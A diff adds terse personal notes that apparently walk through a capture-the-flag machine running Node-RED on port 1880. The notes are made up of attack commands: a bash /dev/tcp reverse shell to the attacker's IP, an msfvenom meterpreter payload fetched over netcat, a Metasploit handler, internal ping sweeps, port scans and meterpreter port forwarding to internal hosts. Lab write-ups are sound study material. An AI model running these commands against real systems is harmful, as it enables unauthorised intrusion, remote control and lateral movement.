@@ -1,0 +1,30 @@
+-- Until get user shell
+# ports can be the same if you use rlwrap
+nmap -p- <ip> -> only 1880, http -> firefox: http://<ip>:1880 -> error message ->
+grep packet in burpsuite & change it to post -> show info: id value, red/{id} -> http://<ip>:1880/red/<id>
+
+tcp(input:connect to <my ip, port>) ---connect---> exec ---connect all 3 ---> tcp(output:reply to tcp)
+nc -lvnp <port> -> get a shell(server1)
+nc -lvnp <port2> -> bash -c 'bash -i >& /dev/tcp/<my ip>/<port2> 0>&1' -> get a better shell that can run some commands(server1)
+
+-- Not needed, but become convenient to run multiple chisel and port forwarding
+msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=<my ip> lport=<port3> -f elf > <reverse_tcp_bin>
+nc -lvnp <temp_port> < <reverse_tcp_bin>
+server1: bash -c 'cat < /dev/tcp/<my ip>/<temp_port> > <reverse_tcp_bin>';
+sudo msfconsole -q; use exploit/multi/handler; set lhost, lport, payload; run
+server1:./<reverse_tcp_bin> -> meterpreter shell
+
+-- Port scanning
+meterpreter: shell; ip addr -> 172.18.0.0/16, 172.19.0.0/16 ->
+for i in {1..10}; do ping -c 1 172.18.0.$i && echo "172.18.0.$i live"; done (also for 172.19.0.$i) -> 172.19.0.1~4(3 local), 172.18.0.1~2(2 local) 
+                                                                             # ip route get <ip> to check localhost - output: <ip> src <localhost>
+meterpreter: use auxiliary/scanner/portscan/tcp; set rhost 172.18.0.1-2 -> run & set rhost 172.19.0.1-4 -> run
+172.18.0.1:1880
+10.10.10.94:1880, 172.18.0.2:223,1880,8080 172.19.0.3:223,1880,8080,9010
+172.19.0.4:80 
+172.19.0.1:x
+172.19.0.2:6379
+
+172.18.0.1:1880 is just showing the same page as 10.10.16.54:1880(meterpreter: portfwd add -l 1880 -r 172.18.0.1 -p 1880; -> visit http://172.18.0.1:1880/red/<id>)
+meterpreter: portfwd add -l <port4> -r 172.19.0.4 -p 80; -> visit http://127.0.0.1:<port4>/ -> ctrl + u: show some api -> can try http://127.0.0.1:<port4>/<url>
+meterpreter: portfwd add -l 6379 -r 172.19.0.2 -p 6379;
